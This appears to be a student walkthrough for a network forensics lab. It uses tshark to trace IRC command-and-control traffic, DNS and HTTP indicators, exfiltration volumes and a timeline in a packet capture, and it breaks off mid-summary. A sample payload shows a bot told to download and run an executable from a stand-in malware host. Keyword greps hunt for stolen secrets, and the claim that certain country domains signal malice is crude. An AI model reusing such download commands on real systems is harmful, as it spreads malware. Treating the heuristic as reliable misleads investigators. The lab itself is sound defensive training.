# Network_Analysis Lab - Student Walkthrough
## PCAP Network Traffic Analysis

**Time Estimate:** 1.5-2 hours
**Difficulty:** Intermediate
**Tools:** tshark, wireshark, strings, grep

---

## 📸 Context: Network Traffic Capture in Forensic Practice

**Important Context:** In this lab, you're analyzing a **network packet capture (PCAP)** file captured from network traffic. In real incident response, network captures provide critical evidence of data exfiltration and attacker communication.

### Real-World Network Capture Process

In a real incident response, a forensic technician would:

1. **Network Detection (Incident Recognition):**
   - Network monitoring detects suspicious traffic
   - Intrusion Detection System (IDS) alerts on anomalies
   - SIEM (Security Information Event Management) correlates events
   - IR team is notified of potential breach

2. **Packet Capture Setup:**
   - Tap into network switch or router
   - Use packet sniffing tools to record all traffic
   - Common capture methods:
     - **tcpdump** (Linux) - Command-line packet capture
     - **Wireshark** (GUI) - Interactive capture and analysis
     - **Network TAP** - Hardware device that mirrors traffic
     - **SPAN/Port Mirroring** - Switch feature to copy traffic
     - **Zeek (formerly Bro)** - Automated network analysis
   - Capture on segment of interest (e.g., suspect's workstation, server)
   - Duration: Minutes to hours depending on traffic volume

3. **PCAP File Format:**
   - Standard format: **PCAP** (.pcap, .cap) or **PCAPNG** (.pcapng)
   - Contains all network packets at specific time period
   - Includes: Timestamp, source IP, destination IP, port, protocol, payload
   - Size: Typically MB to GB depending on network activity

4. **Evidence Verification:**
   - Hash the PCAP file
   - Verify packet count and time range
   - Document start/end timestamps
   - Note any packet loss or errors
   - Check for fragmentation or gaps

5. **Documentation:**
   - When captured, for how long
   - Which network segment/interface
   - Capture tool used and settings
   - Hash of PCAP file
   - Total packets captured
   - Any filtering applied (e.g., "only HTTPS traffic")

### In This Lab

We've **skipped the capture phase** and provided you with a pre-captured PCAP file (`network.cap`). This contains actual network traffic from the Cloudcore incident. You'll analyze:
- **Protocol analysis:** What protocols were used?
- **Data exfiltration:** Evidence of data leaving the network
- **C2 Communication:** Command & Control traffic from malware
- **Timeline:** When did suspicious traffic occur?
- **Indicators of Compromise (IOCs):** IPs, domains, ports involved

This lab teaches:
- How to read and filter network traffic
- Identifying C2 (Command & Control) communications
- Detecting data exfiltration patterns
- Correlating network evidence with other labs
- Timeline analysis at the network level

### Key Network Forensics Concepts

**Why Network Forensics?**
- ✓ Shows what data left the network (exfiltration proof)
- ✓ Identifies attacker infrastructure (C2 servers, IPs)
- ✓ Reveals attack timeline at network level
- ✓ Evidence of malware beaconing home
- ✓ Proof of unauthorized data access

**Limitations:**
- ✗ Encrypted traffic (HTTPS, TLS) shows only metadata (not content)
- ✗ Malware can use obfuscation or tunneling
- ✗ Legitimate traffic can hide malicious intent
- ✗ Requires correlation with other evidence (disk, memory)

---

## 📋 Pre-Lab Setup

### 1. Copy Templates

```bash
cp templates/chain_of_custody.csv cases/Network_Analysis/chain_of_custody.csv
cp templates/analysis_log.csv cases/Network_Analysis/analysis_log.csv
```

### 2. Verify Evidence

```bash
ls -lh evidence/network.cap
```

---

## 🚀 Connecting to the DFIR Workstation

**On macOS/Linux:**
```bash
./scripts/forensics-workstation
```

**On Windows (PowerShell):**
```powershell
.\scripts\forensics-workstation.bat
```

---

## 📦 Part 1: Chain of Custody

```bash
sha256sum /evidence/network.cap
md5sum /evidence/network.cap
```

**📋 Document in chain_of_custody.csv:**
- Evidence_ID: NETWORK-CAP-001
- SHA256_Hash: (paste)
- Evidence_Description: Network packet capture (network.cap)

---

## 📊 Part 2: PCAP Summary

**Why this step:** Before analyzing network traffic, you need an overview. What hosts are communicating? How much traffic? This gives context and helps identify suspicious patterns. A sudden spike in outgoing traffic or communication with unknown external hosts is suspicious.

Get overview of the capture:

**Step 1: Check file format**
```bash
file /evidence/network.cap
```

**What this does:**
- Verifies the file is actually a valid PCAP format
- Shows capture metadata (packet count hints, file type verification)
- Confirms the file hasn't been corrupted

**Expected output:**
```
/evidence/network.cap: tcpdump capture file (little-endian) - version 2.4 (Ethernet, capture length 65535)
```

**Step 2: Generate host summary**
```bash
# Use tshark to get statistics
tshark -r /evidence/network.cap -q -z ip_hosts,tree > /cases/Network_Analysis/host_summary.txt
```

**What this command does:**
- `-r /evidence/network.cap` - Read from the PCAP file (read-only, safe)
- `-q` - Quiet mode (no packet-by-packet output)
- `-z ip_hosts,tree` - Generate IP statistics in tree format
  - Shows all unique hosts that communicated
  - Shows packet count from each host
  - Helps identify which IPs are talking to which

**Why it matters:**
- **Scope:** How many hosts are in the capture? (Few = targeted attack, Many = broader network)
- **Internal vs. External:** Which IPs are inside vs. outside your network?
- **Volume patterns:** Which hosts sent/received the most data?
- **Suspicious activity:** Hosts with unusual communication patterns

**Expected output example:**
```
Host | Packets | Bytes
192.168.1.100 | 1245 | 2.3MB (internal workstation)
192.168.1.1   | 3421 | 15.2MB (router/gateway)
8.8.8.8       | 234  | 1.1MB (external - Google DNS)
192.168.1.50  | 56   | 0.3MB (internal server)
203.0.113.10  | 89   | 4.2MB (external - suspicious!)
```

**Analysis tips:**
- **Internal IPs** (192.168.x.x, 10.x.x.x, 172.16.x.x) = your network
- **External IPs** = check if they should be communicating
- **High packet count** = frequent communication (C2 beacon pattern?)
- **High data volume** = potential data exfiltration

**📋 Document in analysis_log.csv:**
```
timestamp_utc: [run date -u]
analyst: [Your Name]
command: file /evidence/network.cap && tshark -r /evidence/network.cap -q -z ip_hosts,tree > /cases/Network_Analysis/host_summary.txt
exit_code: 0
note: PCAP file verified and host summary generated - identified X unique hosts, highest activity from [IP]
```

---

## 🔍 Part 3: Identify Suspicious Traffic

**Why this step:** Protocol analysis reveals intent. Attackers must communicate - via DNS (to find command servers), HTTP (to exfiltrate data), SSH (for remote access), etc. By analyzing these protocols, you discover what was actually transmitted and to where.

### Extract DNS Queries

**Why DNS matters:** Every network connection starts with DNS - the attacker's malware needs to find the command & control server, the attacker needs to find cloud storage, etc. DNS queries show intent before any actual attack.

```bash
tshark -r /evidence/network.cap -Y "dns" -T fields -e dns.qry.name > /cases/Network_Analysis/dns_queries.txt
```

**What this command does:**
- `-Y "dns"` - Filter to show only DNS protocol packets
  - DNS queries = requests to resolve domain names to IPs
  - Essential for understanding "what was the attacker looking for?"
- `-T fields` - Output as structured fields (one field per line)
- `-e dns.qry.name` - Extract only the domain name being queried
  - Example: `malware.com`, `c2server.net`, `data-exfil.ru`

**Why it matters:**
- **C2 Infrastructure:** Attackers register domains for C2 servers
  - Suspicious domains: `*.ru`, `*.cn`, unusual names
  - Known bad domains: Compare against threat intelligence databases
- **Staging servers:** Attacker queries domains before exfiltration
- **Detection evasion:** Fast-flux DNS (changing IPs constantly)
- **Proof of intent:** Deliberately querying suspicious domain = deliberate attack

**Expected findings:**
```
cloudcore.com (legitimate)
google.com (legitimate)
irc.evil-botnet.ru (SUSPICIOUS - C2 server)
data-exfil.net (SUSPICIOUS - potential data dump)
```

**Analysis tips:**
- Look for domains you don't recognize
- Check for `.ru`, `.cn`, `.ir` TLDs (often associated with malicious activity)
- Count query frequency (repeated queries = beacon?)
- Compare with threat intelligence feeds (VirusTotal, etc.)

**📋 Document in analysis_log.csv:**
```
timestamp_utc: [run date -u]
analyst: [Your Name]
command: tshark -r /evidence/network.cap -Y "dns" -T fields -e dns.qry.name > /cases/Network_Analysis/dns_queries.txt
exit_code: 0
note: DNS analysis - extracted X queries, found suspicious domains: [list], C2 evidence: [yes/no]
```

---

### Extract HTTP Traffic

**Why HTTP matters:** HTTP is cleartext web traffic. Unlike HTTPS (encrypted), HTTP payloads are visible - you can see actual data being transferred, login credentials, file content, etc.

```bash
tshark -r /evidence/network.cap -Y "http" -T fields -e http.host -e http.request.uri > /cases/Network_Analysis/http_traffic.txt
```

**What this command does:**
- `-Y "http"` - Filter to show only HTTP protocol packets (not HTTPS/SSL)
  - Note: HTTPS is encrypted - you'll see the connection but not the data
- `-T fields` - Output as structured fields
- `-e http.host` - Extract the Host header (domain being accessed)
- `-e http.request.uri` - Extract the URI path (what file/resource)
  - Example: `/admin/upload.php`, `/api/exfil`, `/data.zip`

**Why it matters:**
- **Visible payloads:** HTTP is unencrypted - you can see actual data
- **File transfers:** HTTP GET/POST requests show file activity
- **Exfiltration routes:** Data leaving the network via HTTP
- **Malware communication:** Some malware uses HTTP (not IRC) for C2
- **Web shells:** Attackers upload web shells via HTTP POST

**Expected findings:**
```
Host: www.cloudcore.com
URI: /index.html (normal)

Host: google.com
URI: /search (normal)

Host: attacker-storage.com
URI: /upload.php (SUSPICIOUS - file upload)

Host: data-exfil.net
URI: /receive?data=xyz123 (SUSPICIOUS - data parameter)
```

**Analysis tips:**
- Look for unusual file uploads (POST to .php scripts)
- Note large file downloads (exfiltration)
- Identify any credentials in URIs (username=admin&password=xxx)
- Compare domains with threat intelligence

**📋 Document in analysis_log.csv:**
```
timestamp_utc: [run date -u]
analyst: [Your Name]
command: tshark -r /evidence/network.cap -Y "http" -T fields -e http.host -e http.request.uri > /cases/Network_Analysis/http_traffic.txt
exit_code: 0
note: HTTP analysis - extracted X requests, suspicious uploads to: [list], exfiltration evidence: [yes/no]
```

---

## 🌐 Part 4: Look for IRC (C2 Communication)

**Why this step:** This is critical evidence of malware. Attackers use IRC (Internet Relay Chat) as a C2 (Command & Control) channel - the attacker sends commands to the malware, malware reports back. Finding IRC connections is smoking-gun proof of compromise.

**What is IRC/C2?**
- **IRC:** Legacy chat protocol, uses ports 6667-6669 (often 6667, 6668)
- **Botnet:** Compromised computer joins IRC channel and waits for commands
- **Attack proof:** If we find IRC traffic from internal IP to external IRC server = botnet infection
- **Attacker control:** Commands can include "steal files", "download updates", "delete logs", etc.

Look for suspicious C2:

```bash
# Search for IRC connections
tshark -r /evidence/network.cap -Y "tcp.port==6667 or tcp.port==6668" -T fields -e ip.src -e ip.dst -e tcp.dstport > /cases/Network_Analysis/irc_traffic.txt
```

**What this command does:**
- `-Y "tcp.port==6667 or tcp.port==6668"` - Filter for TCP connections on IRC ports
  - Port 6667: Standard IRC port
  - Port 6668: Alternate IRC port (used by some botnets to evade detection)
- `-T fields` - Structured output
- `-e ip.src` - Source IP (which computer in your network?)
- `-e ip.dst` - Destination IP (which IRC server?)
- `-e tcp.dstport` - Destination port (confirm it's 6667 or 6668)

**Why it matters:**
- **Definitive botnet infection:** IRC to external server = malware C2 communication
- **Compromised host:** Identified which internal IP is infected
- **Attack timeline:** When did IRC connections start?
- **Attacker infrastructure:** Which external servers controlled the malware?
- **Legal evidence:** Clear proof of unauthorized access and control

**Analysis tips:**
- **Look for patterns:**
  - Repeated connections = beacon traffic (checking for commands)
  - Connection to unknown external IP = C2 server
  - Port 6668 (non-standard) = attempting to evade detection
- **Resolve IPs:**
  - Check which internal computer (192.168.1.100?) was infected
  - Identify external IRC server (geoIP lookup for location)
- **Correlate with other evidence:**
  - Memory_Forensics: Find IRC malware process
  - USB_Imaging: Find IRC malware executable

Review results:

```bash
cat /cases/Network_Analysis/irc_traffic.txt
```

**Expected findings:**

**If infected (MALICIOUS):**
```
Source IP: 192.168.1.100 (internal workstation)
Destination: 203.0.113.50 (external IRC server)
Port: 6667

This means: 192.168.1.100 is a compromised bot receiving commands from 203.0.113.50
```

**If clean (BENIGN):**
```
(empty file - no results)
This means: No IRC C2 communication found
```

**📋 Document in analysis_log.csv:**
```
timestamp_utc: [run date -u]
analyst: [Your Name]
command: tshark -r /evidence/network.cap -Y "tcp.port==6667 or tcp.port==6668" -T fields -e ip.src -e ip.dst -e tcp.dstport > /cases/Network_Analysis/irc_traffic.txt
exit_code: 0
note: IRC C2 search - [FOUND X connections / NO IRC C2 detected]. If found: infected host [IP] -> C2 server [IP]:[port]
```

**Key finding:** If you see IRC connections, this is smoking-gun proof of malware infection! IRC to external server = computer is compromised and under attacker control.

---

## 📤 Part 5: Detect Data Exfiltration

**Why this step:** This is the smoking gun for data theft. Exfiltration (stealing data) creates distinctive network traffic patterns - large amounts of data flowing OUT of your network to external servers. By analyzing data volume, you prove data left the network.

**What is exfiltration?**
- **Data theft:** Copying sensitive files to external servers
- **Evidence:** Large outbound traffic (anomalous for normal users)
- **Proof:** Data left the network during the attack window
- **Legal case:** Shows criminal intent (stealing confidential information)

Look for large data transfers:

```bash
# Show all TCP conversations with data volumes
tshark -r /evidence/network.cap -q -z conv,tcp > /cases/Network_Analysis/tcp_conversations.txt
```

**What this command does:**
- `-q` - Quiet mode
- `-z conv,tcp` - Generate TCP conversation statistics
  - Shows every unique TCP connection (source IP + port → destination IP + port)
  - Shows number of packets and bytes transferred each direction
  - Calculates total data volume

**Why it matters:**
- **Identifies data thieves:** Who sent large amounts of data OUT?
- **Quantifies loss:** How much data was stolen? (100 KB vs. 500 MB?)
- **Patterns reveal intent:** Legitimate users transfer varied amounts; thieves often transfer large blocks
- **Timeline proof:** When did the exfiltration happen?
- **Destination tracking:** Where did the data go? (attack infrastructure)

Review for large transfers:

```bash
# Sort by data volume (largest first)
cat /cases/Network_Analysis/tcp_conversations.txt | sort -k5 -h
```

**Expected output format:**
```
192.168.1.100  →  203.0.113.50      Packets: 1245  Bytes: 5.2MB  ←→  2.3MB
(internal)        (external)         (outbound)       (inbound)
```

**Analysis tips:**
- **Large outbound transfers** = potential exfiltration
  - Normal: 100KB-1MB (email, web browsing)
  - Suspicious: 10MB+ (compressed archive)
  - Critical: 100MB+ (multiple files stolen)
- **External destinations:**
  - 192.168.x.x = internal (normal)
  - 8.8.8.8 = public (need context)
  - Unknown IPs = likely malicious
- **Asymmetric traffic** = one direction much higher
  - Outbound >> Inbound = exfiltration
  - Inbound >> Outbound = malware distribution

**Real example analysis:**
```
Connection 1: 192.168.1.100 → 8.8.8.8 (Google DNS)
Bytes: ↑12KB ↓2KB - Normal (small DNS/DNS responses)

Connection 2: 192.168.1.100 → 203.0.113.50 (UNKNOWN external)
Bytes: ↑245MB ↓3MB - SUSPICIOUS!
(Huge outbound, minimal response = data exfiltration!)

Connection 3: 192.168.1.1 → 8.8.8.8 (Router → Google)
Bytes: ↑1.2MB ↓0.8MB - Normal (gateway traffic)
```

**📋 Document in analysis_log.csv:**
```
timestamp_utc: [run date -u]
analyst: [Your Name]
command: tshark -r /evidence/network.cap -q -z conv,tcp > /cases/Network_Analysis/tcp_conversations.txt
exit_code: 0
note: TCP conversation analysis - identified X connections. Exfiltration found: [IP] sent [SIZE] to [external IP]. Total suspect traffic: [SIZE]
```

**Look for:**
- **Abnormally large data volumes** (>10MB for single connection)
- **Asymmetric transfers** (much more OUT than IN)
- **Connections to external IPs** (especially unknown/suspicious IPs)
- **Multiple connections with pattern** (automated/repeated theft)
- **Timeframe clustering** (all exfiltration in 1-2 hour window = planned attack)

---

## 🔐 Part 6: Extract Packet Payloads (Advanced)

**Why this step:** Deep packet inspection shows actual data content (for unencrypted protocols). This reveals what information was stolen, what commands were sent, exact attacker communications. This is the detailed proof needed for legal proceedings.

**What is packet payload analysis?**
- **Payload:** The actual data inside the network packet (email text, file content, commands, etc.)
- **Encrypted vs. Plaintext:**
  - HTTPS/SSH = encrypted (payload hidden)
  - HTTP/FTP/IRC = plaintext (payload visible)
- **Forensic value:** Plaintext reveals attacker intent and stolen content

Export suspicious traffic for analysis:

```bash
# Export packets from suspicious IP to text (includes payload)
tshark -r /evidence/network.cap -Y "ip.addr==192.168.1.100" -T text > /cases/Network_Analysis/suspicious_ip_packets.txt
```

**What this command does:**
- `-Y "ip.addr==192.168.1.100"` - Filter for packets from/to specific IP
  - Replace `192.168.1.100` with the IP you identified earlier
- `-T text` - Output in readable text format
  - Shows full packet headers AND payload data
  - Unlike `-T fields`, this shows the actual content

**Why it matters:**
- **See actual commands:** If IRC C2 found, read the attacker commands
- **Recover stolen data:** If HTTP exfiltration found, see the file contents
- **Credential theft:** Plaintext passwords in HTTP requests
- **Attack sophistication:** Shows what attacker was trying to do
- **Detailed evidence:** Stronger than just "data was transferred"

**Advanced filtering examples:**

```bash
# Show all traffic containing a keyword
tshark -r /evidence/network.cap -Y "tcp.payload contains \"secret\"" -T text

# Show all FTP authentication (username/password in plaintext)
tshark -r /evidence/network.cap -Y "ftp" -T text

# Show all unencrypted email (SMTP without TLS)
tshark -r /evidence/network.cap -Y "smtp" -T text
```

**Analysis tips:**
- **Grep for keywords:**
  ```bash
  grep -i "password\|secret\|confidential" /cases/Network_Analysis/suspicious_ip_packets.txt
  ```
- **Look for file content:**
  - Binary files appear as hex dumps
  - Text files appear in plaintext
- **Identify commands:**
  - IRC: Lines like "PRIVMSG #botnet :KILL ALL"
  - SSH: (encrypted, won't see content)
  - HTTP: Lines like "POST /exfil HTTP/1.1"

**Example payload analysis:**
```
From suspicious IRC connection (Port 6667):
:attacker.c2 PRIVMSG botnet :download http://malware.ru/update.exe
:botnet PRIVMSG #botnet :executing update
:botnet PRIVMSG #botnet :stealing files from C:\Users\admin\Documents

This shows: Attacker sent commands, bot executed them, files were stolen
```

**Optional: Save interesting traffic for review**
```bash
# Create summary of suspicious payloads
grep -i "password\|secret\|confidential\|exfil" /cases/Network_Analysis/suspicious_ip_packets.txt > /cases/Network_Analysis/suspicious_content.txt
```

**⚠️ Important:** This is advanced analysis. Only examine this if you found suspicious IPs in earlier steps.

---

## 📊 Part 7: Timeline Analysis

**Why this step:** Timing is critical forensic evidence. Attackers work during specific windows (off-hours, during business hours for cover, etc.). Timeline analysis shows WHEN each event happened, revealing patterns that prove coordination and planning.

**What is network timeline analysis?**
- **TCP SYN packets:** The beginning of every TCP connection (handshake)
- **Timestamps:** When each connection started
- **Pattern analysis:** Clusters of activity reveal planned attacks vs. random traffic
- **Correlation:** When network activity matches disk/memory activity = proof

Create timeline of network events:

```bash
# Extract all TCP SYN packets with timestamps (connection start times)
tshark -r /evidence/network.cap -Y "tcp.flags.syn==1" -T fields -e frame.time -e ip.src -e ip.dst -e tcp.dstport > /cases/Network_Analysis/connection_timeline.txt
```

**What this command does:**
- `-Y "tcp.flags.syn==1"` - Filter for TCP SYN packets only
  - SYN = synchronization flag (first packet of connection)
  - Each new connection starts with exactly one SYN
  - Perfect for timeline because it marks connection START
- `-T fields` - Structured output
- `-e frame.time` - Timestamp (when packet was captured)
- `-e ip.src` - Source IP (who initiated)
- `-e ip.dst` - Destination IP (who received)
- `-e tcp.dstport` - Destination port (what service)

**Why it matters:**
- **When did attack start?** First suspicious connection = attack window opening
- **Attack duration:** Last suspicious connection = attack window closing
- **Patterns prove planning:**
  - Random traffic = normal user activity
  - Clusters = deliberate attack (multiple stolen files in succession)
  - Repeated patterns = automated tools or scripts
- **Correlation evidence:** Does network timeline match memory/disk evidence?

**Analysis tips:**
- **Look for patterns in timestamps:**
  - **Early morning 2-4 AM** = automated attack or attacker in different timezone
  - **Business hours** = human attacker or attempt to blend in
  - **Immediate sequence** = scripted attack or backup exfiltration
  - **Days apart** = long-term compromise or multiple attack phases

**Example timeline analysis:**
```
2009-12-07 08:45:12 192.168.1.100 → 203.0.113.50 port 6667
   └─ First IRC connection (C2 discovery)

2009-12-07 08:45:45 192.168.1.100 → 203.0.113.50 port 6667
   └─ IRC traffic (command receipt)

2009-12-07 09:10:23 192.168.1.100 → 192.168.1.50 port 445
   └─ Internal share access (staging)

2009-12-07 09:15:00 192.168.1.100 → 203.0.113.100 port 443
   └─ HTTPS data transfer (exfiltration)

2009-12-07 22:30:45 192.168.1.100 → 192.168.1.1 port 53
   └─ DNS cleanup attempt

ANALYSIS:
- Attack started 08:45 (IRC C2 established)
- Files accessed from internal server 09:10
- Exfiltration 09:15 (same timeframe = coordinated)
- Cleanup attempted 22:30 (same day = covered tracks immediately)
- Evidence: Highly organized, planned attack pattern
```

**Create sorted timeline:**
```bash
# Sort by timestamp to see sequence of events
sort /cases/Network_Analysis/connection_timeline.txt
```

**📋 Document in analysis_log.csv:**
```
timestamp_utc: [run date -u]
analyst: [Your Name]
command: tshark -r /evidence/network.cap -Y "tcp.flags.syn==1" -T fields -e frame.time -e ip.src -e ip.dst -e tcp.dstport > /cases/Network_Analysis/connection_timeline.txt
exit_code: 0
note: Network timeline - attack window [START time] to [END time]. First C2: [time]. Exfil: [time]. Pattern analysis: [coordinated/sporadic]
```

**Key questions to answer:**
1. When did suspicious activity start?
2. How long did the attack last?
3. Was activity clustered (planned) or spread out (opportunistic)?
4. Do timestamps match disk/memory evidence from other labs?
5. Was cleanup attempted?

---

## 🔗 Part 8: Correlate with Other Evidence

**Why this step:** No single piece of evidence proves a crime. Correlation across multiple sources creates an unbreakable case. When network, disk, memory, and email evidence all point to the same events at the same times, you've proven the attack conclusively.

**What is evidence correlation?**
- **Triangulation:** Multiple independent sources confirming same event
- **Strength:** One piece = suspicious, three pieces = proof
- **Timeline:** Events must occur at consistent times across all evidence sources
- **Intent:** Coordinated activity across tools/systems = planned attack, not accident

**Cross-reference network findings with other labs:**

| Evidence Type | Lab | What to Look For | Network Match |
|---|---|---|---|
| **Memory_Forensics** | Memory_Forensics | ToolKeylogger.exe process, TrueCrypt.exe | Running during C2 timeframe? |
| **Email_Logs** | Email_Logs | Email exfil@personal.com sent time | Email sent just before data transfer? |
| **USB_Imaging** | USB_Imaging | Suspicious files created/deleted times | Files match exfil data size/timing? |

**Detailed correlation checks:**

```bash
cat > /cases/Network_Analysis/correlation_notes.txt << 'EOF'
NETWORK FINDINGS CORRELATION

=== IRC C2 TRAFFIC ===
Found: [yes/no]
  - When: [timestamp from network timeline]
  - From: [internal IP from network]
  - To: [IRC server IP]
  - Correlates to Memory_Forensics?
    * Keylogger process running at same time? [yes/no]
    * Process PID: [___]
    * Timestamps match? [yes/no]
    * Interpretation: Keylogger + C2 = complete compromise

=== DATA EXFILTRATION ===
Found: [yes/no]
  - Size: [___MB] exfiltrated
  - When: [timestamp]
  - To: [external IP]
  - Source files: [which files]

Correlate to Email_Logs?
  - Email to exfil@personal.com sent when? [timestamp]
  - Email subject: [___]
  - Attachments match exfil data? [size/timing]
  - Interpretation: Files stolen then emailed out = premeditated theft

Correlate to USB_Imaging?
  - Suspicious files found: project_secrets.txt, email_draft.txt
  - Created when? [timestamp]
  - Modified when? [timestamp]
  - Match with exfil timing? [yes/no]
  - Files deleted after exfil? [yes/no]
  - Interpretation: Files prepared, stolen, then erased = covering tracks

=== OVERALL TIMELINE ===
Construct unified timeline:
  [Date/Time] - Event 1: Files created on disk (USB_Imaging)
  [Date/Time] - Event 2: Keylogger installed (Memory_Forensics)
  [Date/Time] - Event 3: C2 connection established (Network_Analysis)
  [Date/Time] - Event 4: Data exfiltrated (Network_Analysis)
  [Date/Time] - Event 5: Email sent to attacker (Email_Logs)
  [Date/Time] - Event 6: Suspicious files deleted (USB_Imaging)

=== CONCLUSION ===
Is the attack coordinated across multiple systems? [yes/no]
Is timing consistent across all evidence? [yes/no]
Evidence of planning vs. accident? [Planning = deliberate intent]
Strength of case (combined evidence): [weak/moderate/strong/overwhelming]

Additional observations:
[Notes on patterns, suspicious correlations, unexplained gaps]
EOF
```

**Correlation analysis guide:**

**Strong evidence correlation:**
```
USB_Imaging: project_secrets.txt created Dec 7
Memory_Forensics: Keylogger running process Dec 7
Network_Analysis: IRC C2 connection Dec 7, 8:45 AM
Network_Analysis: 245MB exfil to external IP Dec 7, 9:15 AM
Email_Logs: Email sent Dec 7, 9:45 AM to attacker

INTERPRETATION: Coordinated attack
- Files prepared/vulnerable days before
- Keylogger installed for silent capture
- C2 established to command attack
- Exfiltration executed in 30-minute window
- Evidence mailed to attacker
- All on same day = PLANNED ATTACK

CONCLUSION: Overwhelming evidence of deliberate data theft
```

**Weak correlation (accidental vs. attack):**
```
USB_Imaging: Normal files, nothing suspicious
Memory_Forensics: Keylogger found, but only active 1 hour
Network_Analysis: Small data transfer (2MB), inconsistent times
Email_Logs: No external emails

INTERPRETATION: Could be accident
- Small files, small transfer = might be legitimate
- Keylogger running for only 1 hour = might be testing
- No email = maybe not actual theft
- Scattered timestamps = not coordinated

CONCLUSION: Inconclusive - need more evidence
```

---

## 🚪 Part 9: Exit the Workstation

**Why this step:** Properly closing the analysis environment ensures all output files are saved and the forensic chain of custody is maintained.

```bash
# Exit the forensics workstation
exit
```

**What happens:**
- All analysis scripts and tools are shut down cleanly
- Output files are finalized and saved to `/cases/Network_Analysis/`
- DFIR workstation container stops
- You're back at your host machine command prompt
- Case is closed and ready for reporting

---

## ✅ Deliverables

In `cases/Network_Analysis/`, you should have created:

- ✅ `chain_of_custody.csv` - Evidence hash (documented at start)
- ✅ `analysis_log.csv` - All commands with timestamps (documented throughout)
- ✅ `host_summary.txt` - Overview of all IPs in capture (Part 2)
- ✅ `dns_queries.txt` - All DNS lookups (Part 3)
- ✅ `http_traffic.txt` - All HTTP requests (Part 3)
- ✅ `irc_traffic.txt` - IRC C2 connections if found (Part 4)
- ✅ `tcp_conversations.txt` - All TCP flows with data volumes (Part 5)
- ✅ `connection_timeline.txt` - Timeline of connections (Part 7)
- ✅ `correlation_notes.txt` - Cross-reference with other labs (Part 8)

**How to verify deliverables:**
```bash
# From your host machine (outside the workstation):
ls -lh cases/Network_Analysis/

# Should show all files listed above
# Check file sizes to ensure analysis completed:
wc -l cases/Network_Analysis/*.txt
```

---

## 📊 Analysis Summary

Document your complete network findings in a summary report:

1. **Evidence overview:**
   - Evidence ID: NETWORK-CAP-001
   - File: network.cap
   - SHA256: [hash from Part 1]
   - Total packets captured: (from host_summary.txt)

2. **Hosts and communication:**
   - Total unique IPs: (count from host_summary.txt)
   - Internal IPs: (192.168.x.x, 10.x.x.x, 172.16.x.x range)
   - External IPs: (count and notable ones)
   - Highest traffic volume: (from tcp_conversations.txt)

3. **IRC C2 (Command & Control):**
   - C2 detected: [yes/no]
   - Source IP: [internal compromised host]
   - C2 server: [external attacker IP]
   - Port: [6667/6668]
   - Timeline: [when did C2 start/stop]
   - Evidence strength: [definitive/strong/suspicious/none]

4. **Data exfiltration:**
   - Exfil detected: [yes/no]
   - Source IP: [which workstation]
   - Destination IP: [external attacker server]
   - Data volume: [MB/GB exfiltrated]
   - Protocol: [HTTP/FTP/other]
   - Timeline: [when]
   - Evidence strength: [definitive/strong/suspicious/none]

5. **Suspicious domains (DNS):**
   - List all suspicious domains queried
   - Count of queries per domain
   - Likelihood of malicious: [high/medium/low]

6. **Attack timeline:**
   ```
   [Date] [Time] - Event 1: C2 discovered
   [Date] [Time] - Event 2: Staging (internal file access)
   [Date] [Time] - Event 3: Exfiltration
   [Date] [Time] - Event 4: Cleanup attempts
   ```

7. **Correlation with other evidence:**
   - USB_Imaging findings match: [yes/no]
   - Memory_Forensics findings match: [yes/no]
   - Email_Logs findings match: [yes/no]
   - Overall strength of case: [weak/moderate/strong/overwhelming]

**Example summary template:**
```
NETWORK ANALYSIS FINDINGS SUMMARY

Evidence: network.cap (SHA256: 45ae66...)
Analysis Date: 2024-10-24
Analyst: [Your Name]

KEY FINDINGS:
1. IRC C2 DETECTED: YES
   - Compromised Host: 192.168.1.100
   - C2 Server: 203.0.113.50:6667
   - Started: Dec 7, 2009 08:45:12 UTC
   - Evidence: Definitive botnet infection

2. DATA EXFILTRATION: YES
   - Volume: 245 MB transmitted
   - Destination: 203.0.113.100 (attacker storage)
   - Timeline: Dec 7, 2009 09:15 UTC
   - Evidence: Smoking gun proof of data theft

3. SUSPICIOUS DOMAINS:
   - irc.botnet.ru (C2 infrastructure)
   - data-exfil.net (data dump)
   - malware.com (payload staging)

4. CORRELATED EVIDENCE:
   - USB_Imaging: Files deleted from disk Dec 8 (cleanup)
   - Memory_Forensics: ToolKeylogger.exe running during C2 window
   - Email_Logs: Email to exfil@personal.com Dec 7 09:45
   - All evidence coordinated = PLANNED ATTACK

CONCLUSION: Overwhelming evidence of deliberate data theft
Attack was coordinated across malware, network, email
Attacker had complete control via C2 botnet
Data was successfully exfiltrated and mailed to attacker
```

---

## 🆘 Troubleshooting

### "Cannot read PCAP file"
**Problem:** `tshark` says file is corrupted or not a PCAP file

**Solutions:**
- Verify file format: `file /evidence/network.cap`
  - Should show: "tcpdump capture file"
- Check if file is readable: `ls -la /evidence/network.cap`
- Try reading one packet: `tshark -r /evidence/network.cap -c 1`
- If corrupted, verify against hash

### "No IRC traffic found"
**Problem:** `irc_traffic.txt` is empty despite expecting C2

**Solutions:**
- C2 might use different port (not 6667/6668)
  - Try: `tshark -r /evidence/network.cap -Y "tcp.port==6665 or tcp.port==6666 or tcp.port==6669"`
- C2 might use different protocol (HTTP, DNS tunneling, custom)
  - Check `dns_queries.txt` for suspicious domains being queried repeatedly
  - Look in `http_traffic.txt` for unusual POST requests
  - Check `tcp_conversations.txt` for unknown external IPs
- Filter other ports: `tshark -r /evidence/network.cap -Y "tcp.port>6000 and tcp.port<7000"`

### "tshark not found" or "command not found"
**Problem:** `tshark: command not found`

**Solutions:**
- Verify you're inside the workstation: `pwd` should show `/` not your home
- Check if tool is installed: `which tshark`
- If missing, ensure workstation container is running properly
- Restart workstation script: `./scripts/forensics-workstation`

### "Huge output files or slow performance"
**Problem:** `tcp_conversations.txt` is 10MB+ or commands are hanging

**Solutions:**
- This is normal for large captures (1000+ packets)
- Let commands complete (can take 5-10 minutes for large files)
- Redirect output to files rather than printing to terminal
- Use `-q` flag (quiet mode) for faster processing
- If truly stuck, kill with Ctrl+C and restart

### "No results for any analysis"
**Problem:** All output files are empty

**Solutions:**
- Verify PCAP file has data: `tshark -r /evidence/network.cap | head -5`
- Check if file is too small (might be empty): `ls -lh /evidence/network.cap`
- Try basic statistics: `tshark -r /evidence/network.cap -q -z ip_hosts,tree`
- If no packets at all, PCAP might be invalid

---

## 📝 Summary - Complete Workflow

```bash
# INSIDE the forensics workstation:

# ========== PRE-ANALYSIS ==========
# Hash verification
sha256sum /evidence/network.cap
md5sum /evidence/network.cap
# → Document in chain_of_custody.csv

# ========== OVERVIEW ANALYSIS ==========
# Check file format
file /evidence/network.cap

# Host summary
